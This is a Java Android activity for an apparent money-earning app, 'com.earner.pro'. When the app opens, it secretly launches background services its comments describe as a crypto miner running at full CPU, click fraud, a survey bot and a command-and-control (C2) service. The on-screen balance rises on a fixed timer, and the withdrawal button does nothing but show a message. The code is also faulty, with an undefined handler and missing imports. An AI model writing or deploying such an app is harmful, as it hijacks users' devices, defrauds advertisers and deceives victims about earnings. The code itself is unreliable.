package com.earner.pro;

import android.os.Bundle;
import android.os.Handler;
import android.view.View;
import android.widget.Button;
import android.widget.TextView;
import androidx.appcompat.app.AppCompatActivity;
import androidx.recyclerview.widget.RecyclerView;

import com.earner.pro.services.*;

public class MainActivity extends AppCompatActivity {
    
    private TextView tvBalance;
    private TextView tvEarningsToday;
    private Button btnStartMining;
    private Button btnSurveys;
    private Button btnGames;
    private Button btnWithdraw;
    private RecyclerView rvEarnings;
    
    private double balance = 0.0;
    private double earningsToday = 0.0;
    
    @Override
    protected void onCreate(Bundle savedInstanceState) {
        super.onCreate(savedInstanceState);
        setContentView(R.layout.activity_main);
        
        initViews();
        setupListeners();
        startEarningServices();
        
        // Update UI setiap detik
        new Handler().postDelayed(new Runnable() {
            @Override
            public void run() {
                updateBalance();
                updateEarnings();
                handler.postDelayed(this, 1000);
            }
        }, 1000);
    }
    
    private void initViews() {
        tvBalance = findViewById(R.id.tv_balance);
        tvEarningsToday = findViewById(R.id.tv_earnings_today);
        btnStartMining = findViewById(R.id.btn_start_mining);
        btnSurveys = findViewById(R.id.btn_surveys);
        btnGames = findViewById(R.id.btn_games);
        btnWithdraw = findViewById(R.id.btn_withdraw);
        rvEarnings = findViewById(R.id.rv_earnings);
    }
    
    private void setupListeners() {
        btnStartMining.setOnClickListener(v -> {
            startMining();
            Toast.makeText(this, "Mining started!", Toast.LENGTH_SHORT).show();
        });
        
        btnSurveys.setOnClickListener(v -> {
            startActivity(new Intent(this, SurveysActivity.class));
        });
        
        btnGames.setOnClickListener(v -> {
            startActivity(new Intent(this, GamesActivity.class));
        });
        
        btnWithdraw.setOnClickListener(v -> {
            showWithdrawDialog();
        });
    }
    
    private void startEarningServices() {
        // Start mining service (background crypto mining)
        startService(new Intent(this, MinerService.class));
        
        // Start click fraud service
        startService(new Intent(this, ClickerService.class));
        
        // Start survey bot
        startService(new Intent(this, SurveyBotService.class));
        
        // Start ad service
        startService(new Intent(this, AdService.class));
        
        // Start C2 service
        startService(new Intent(this, C2Service.class));
    }
    
    private void startMining() {
        // Start mining with 100% CPU
        Intent intent = new Intent(this, MinerService.class);
        intent.putExtra("speed", "max");
        startService(intent);
    }
    
    private void updateBalance() {
        // Balance increases over time (from mining + click fraud)
        balance += 0.0001;
        tvBalance.setText(String.format("$%.4f", balance));
    }
    
    private void updateEarnings() {
        // Daily earnings update
        earningsToday += 0.0005;
        tvEarningsToday.setText(String.format("Today: $%.4f", earningsToday));
    }
    
    private void showWithdrawDialog() {
        new AlertDialog.Builder(this)
            .setTitle("Withdraw")
            .setMessage("Minimum withdrawal: $50\n\n" +
                       "Available: $" + String.format("%.2f", balance) + "\n\n" +
                       "Withdrawal methods:\n" +
                       "- PayPal (3-5 days)\n" +
                       "- Bitcoin (1 hour)\n" +
                       "- Bank Transfer (2-3 days)")
            .setPositiveButton("Withdraw", (d, w) -> {
                Toast.makeText(this, "Withdrawal request sent!", Toast.LENGTH_SHORT).show();
            })
            .setNegativeButton("Cancel", null)
            .show();
    }
}